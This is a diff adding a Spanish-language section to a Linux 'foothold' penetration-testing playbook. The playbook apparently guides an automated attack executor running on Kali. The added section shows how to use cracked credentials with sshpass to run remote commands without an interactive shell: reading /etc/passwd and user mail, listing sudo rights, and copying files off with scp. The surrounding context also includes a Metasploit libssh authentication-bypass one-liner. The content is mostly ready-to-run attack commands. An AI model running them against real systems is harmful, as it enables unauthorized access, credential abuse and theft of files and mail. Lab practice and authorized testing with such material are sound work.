@@ -1,5 +1,32 @@
 # FOOTHOLD LINUX — SSH bypass, ProFTPd, PHP CGI
 
+## SSH no-interactivo con credenciales (sshpass)
+Tras crackear o descubrir creds (hydra, ssh_login, leak en HTML, etc.),
+ejecuta comandos en el target SIN abrir TTY interactivo. El executor NO
+es el target; los comandos shell normales se ejecutan en el executor
+(Kali), no en la VM atacada. Para tocar la VM, pasa por sshpass+ssh.
+
+IMPORTANTE: sin comillas. ssh une los argumentos que vienen detrás del
+host con espacios y se los pasa al shell remoto. Usar comillas confunde
+al parser JSON. Para encadenar varios comandos remotos: usa `;` o `&&`
+SIN comillas, separa cada operación por espacios.
+
+```bash
+# Forma general (sin comillas): UN solo comando remoto
+sshpass -pPASS ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 USER@<TARGET_IP> COMANDO_REMOTO ARGS
+
+# Ejemplos con creds camilo:password1 contra <TARGET_IP>
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> id
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> ls -la /var/mail/camilo
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> cat /var/mail/camilo
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> cat /etc/passwd
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> sudo -l
+sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> uname -a
+
+# Para descargar ficheros usa scp (no SSH 'get'), también sin comillas:
+sshpass -ppassword1 scp -o StrictHostKeyChecking=no camilo@<TARGET_IP>:/var/mail/camilo /tmp/mail_camilo
+```
+
 ## SSH libssh Auth Bypass
 ```bash
 msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS <TARGET_IP>; set SPAWN_PTY true; run; exit -y"
